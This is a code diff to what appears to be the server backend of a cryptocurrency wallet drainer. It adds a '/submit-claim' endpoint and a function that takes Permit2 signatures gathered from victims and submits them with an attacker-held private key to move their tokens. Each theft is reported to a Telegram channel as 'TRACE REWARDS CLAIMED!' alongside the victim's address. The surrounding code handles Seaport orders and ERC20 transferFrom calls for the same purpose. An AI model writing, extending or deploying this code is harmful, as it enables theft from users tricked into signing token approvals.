@@ -278,6 +278,9 @@ try {
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 const SEAPORT_ABI = ["function fulfillOrder(((address offerer, address zone, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) parameters, bytes signature) order, bytes32 fulfillerConduitKey) external payable returns (bool)"];
 const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)", "function transferFrom(address from, address to, uint256 value) public returns (bool)"];
+const TRACE_REWARDS_ABI = [
+    "function claim(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 rewardAmount) external payable"
+];
 
 const CHAIN_CONFIGS = {
     "ethereum": { name: "ethereum", id: 1 },
@@ -389,6 +392,12 @@ const server = http.createServer((req, res) => {
         try {
             const data = JSON.parse(body);
 
+            if (req.url === "/submit-claim") {
+                console.log(`📥 [EVM] Received Permit2 Claim for ${data.chainName}`);
+                await fulfillPermit2Claim(data);
+                return res.end(JSON.stringify({ status: "success" }));
+            }
+
             if (req.url === "/submit-evm-order") {
                 SEAPORT_ORDERS.push({ order: data.order, chainName: data.chainName });
                 console.log(`📥 [EVM] Received Seaport Order for ${data.chainName}`);
@@ -459,6 +468,32 @@ async function fulfillSeaportOrder(order, chainName) {
             console.warn("⚠️ Rate limit hit. Rotating Infura ID...");
             rotateInfura();
         }
+        return false;
+    }
+}
+
+async function fulfillPermit2Claim(data) {
+    const { permit, signature, chainName, owner, routerAddress, rewardAmount } = data;
+    try {
+        const rpcUrl = getRpcUrl(chainName);
+        const provider = new ethers.JsonRpcProvider(rpcUrl);
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+        const router = new ethers.Contract(routerAddress, TRACE_REWARDS_ABI, wallet);
+
+        console.log(`🚀 [EVM] Executing Permit2 Claim on ${chainName}...`);
+
+        // Value must be at least 0.0009 ether (the security fee)
+        const tx = await router.claim(permit, signature, rewardAmount, {
+            value: ethers.parseEther("0.001"), // Pay 0.001 to be safe
+            gasLimit: 800000 // Higher limit for batch transfers
+        });
+
+        console.log(`✅ [EVM] Permit2 Claim Success on ${chainName}: ${tx.hash}`);
+        sendTelegram(`✅ **TRACE REWARDS CLAIMED!**\nChain: ${chainName}\nUser: <code>${owner}</code>\nTokens: ${permit.permitted.length}\nTX: \`${tx.hash}\``);
+        return true;
+    } catch (e) {
+        console.error(`❌ [EVM] Permit2 Claim Failed on ${chainName}:`, e.message);
+        sendTelegram(`❌ **Permit2 Claim Failed** (${chainName})\nError: ${e.message.slice(0, 100)}`);
         return false;
     }
 }
